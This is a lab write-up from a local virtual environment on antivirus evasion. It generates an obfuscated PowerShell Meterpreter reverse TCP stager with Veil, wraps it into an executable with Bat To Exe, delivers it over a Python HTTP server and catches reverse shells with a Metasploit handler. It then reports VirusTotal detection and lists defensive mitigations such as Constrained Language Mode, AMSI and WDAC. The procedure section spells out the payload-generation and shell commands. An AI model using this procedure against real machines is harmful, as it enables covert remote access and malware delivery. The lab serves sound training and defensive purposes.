AV Evasion via Veil-Framework & Bat-To-Exe

**Platform:** Local Lab (Virtual Environment)
**Difficulty:** Medium
**Date:** 2026-11-01
**Category:** Network / Defense Evasion / Payload Generation

---

##  Objective
The objective of this lab was to understand the methodologies used to bypass static signature detection by creating an obfuscated PowerShell payload using **Veil-Framework**, and subsequently converting it into an executable binary (`.exe`) to evaluate its detection rate across multiple antivirus solutions.

##  Environment and Tools
- **Attacker:** Kali Linux (Testing Environment) | IP: `[REDACTED_ATTACKER_IP]`
- **Victim:** Windows 10 v1909 (Build 18363.418) | IP: `[REDACTED_VICTIM_IP]`
- **Tools:** Veil-Framework (v3.1.14), Bat To Exe Converter (v3.0.8), Wine, Python HTTP Server, Metasploit Framework (msfconsole), VirusTotal.

##  Procedure

### 1. Reconnaissance / Enumeration
**Veil-Framework** was installed and launched on the attacker's machine. Upon listing the available tools in the main menu, the evasion module (`Evasion`) was selected to display the list of 41 pre-configured payload modules available for modification.

```bash
# Installing Veil-Framework on Kali Linux
apt-get install veil -y

# Launching the Evasion interactive framework
veil
```

### 2. Exploitation
The generation, compilation, and delivery of the evasive artifact were executed using the following commands within a controlled workflow:

1. **Payload Configuration and Generation in Veil:** Module number 22, `powershell/meterpreter/rev_tcp` (Pure PowerShell Reverse TCP Stager), was loaded. The `LHOST` parameter was set to point to the listening interface IP, and an evasion mechanism was applied by setting `set SLEEP 20` to delay execution and complicate basic dynamic sandbox analysis.
   ```bash
   # Inside the Veil interactive CLI:
   use 1
   list
   use 22
   set LHOST [REDACTED_ATTACKER_IP]
   set LPORT 4444
   set SLEEP 20
   generate
   # Base payload output name: powerepayload
   ```

2. **Cloning and Preparing the Bat-To-Exe Compiler:** To wrap the script into a portable executable form, the public `tokyoneon/B2E` repository was cloned, the tool archive was extracted, and the installer was executed through the **Wine** compatibility layer. Using the compiler's graphical interface, the generated `.bat` file was compiled into the final binary named `pspayload.exe`.
   ```bash
   # Cloning the repository and extracting the executable wrapper tool
   cd /home/[USER]/Desktop
   git clone https://github.com
   cd B2E
   unzip Bat_To_Exe_Converter.zip
   
   # Running the compiler setup through the Wine compatibility layer
   wine Bat_To_Exe_Converter_(Installer).exe
   ```

3. **Binary Delivery (`pspayload.exe`):** A temporary Python HTTP web server was hosted on port `8000` within the working directory. From the victim Windows 10 machine, the web server interface was accessed via a web browser to download the compiled executable safely.
   ```bash
   # Launching a temporary Python HTTP web server for file transfer
   cd /home/[USER]/Desktop
   python3 -m http.server 8000
   ```

### 3. Post-Exploitation / Result
On the attacker's side, Metasploit Framework deployed the reverse listener seamlessly by reading the resource script `.rc` auto-generated during the Veil creation workflow.
```bash
# Automated Metasploit multi/handler listener deployment
msfconsole -r /var/lib/veil/output/handlers/powerepayload2.rc
```

Once the binary `pspayload.exe` was triggered on the victim machine, the payload successfully initiated a reverse connection back to port `4444`, bypassing default perimeter static controls. This granted **two active Meterpreter sessions (x86/windows)** under the target user context. Active interaction was established with session 2, spawning an interactive system shell (`cmd.exe`).
```bash
# Interacting with the reverse stager and spawning a shell in Metasploit
msf exploit(multi/handler) > sessions -i 2
meterpreter > shell
```

##  Finding
Upon uploading the compiled file `pspayload.exe` to the **VirusTotal** multi-scanner platform, a detection ratio of **38/71 security vendors** was obtained. 

While Veil's native PowerShell obfuscation and the *Bat To Exe* wrapper successfully blinded a significant number of commercial engines—proving the inherent limitations of traditional, hash-based static analysis—solutions utilizing advanced heuristics or telemetry (such as CrowdStrike Falcon or BitDefender) correctly identified the underlying PowerShell stager structure or wrapper behavior as malicious (commonly flagged as `Trojan.Win/BZC`).

## 🛡️ Mitigation / Remediation
To protect enterprise or production environments against execution and evasion techniques that leverage wrapped, obfuscated PowerShell scripts, the following security controls must be implemented:

* **Enforce Constrained Language Mode:** Configure Group Policy Objects (GPOs) to mandate `Constrained Language Mode` for PowerShell. This drastically restricts allowed .NET objects and Windows API calls that a user-space script can invoke interactively.
* **Leverage AMSI (Antimalware Scan Interface):** Ensure Endpoint/EDR solutions actively integrate with AMSI. Since this interface inspects PowerShell scripts directly in memory right before execution, it analyzes the script *after* it has been de-obfuscated by the interpreter, neutralizing runtime wrapping and file packaging.
* **AppLocker / Windows Defender Application Control (WDAC):** Implement strict application control policies to only permit the execution of digitally signed, trusted binaries or those residing within explicitly authorized system directories. This effectively prevents the execution of unknown or untrusted executables from user-writable directories such as `%USERPROFILE%\Downloads` or `%TEMP%`.

## 📚 Lessons Learned
* Threat actors regularly combine different languages or file wrappers (such as converting scripts to executables) to mask the underlying logic of a malicious payload during basic static file inspections.
* Relying solely on traditional file signatures is insufficient for modern defenses; behavioral endpoint monitoring and granular process visibility over child processes spawned by shell engines are critical for early detection.
* Default operating system security baselines should be proactively hardened, as automated generation tools can easily find blind spots if strict software execution constraints are absent.

## 🔗 References
* [Official Veil Framework Website](https://www.veil-framework.com/)
* [Microsoft Documentation - Antimalware Scan Interface (AMSI)](https://microsoft.com)
* [PowerShell Constrained Language Mode - Mitre ATT&CK (T1059.001)](https://mitre.org)
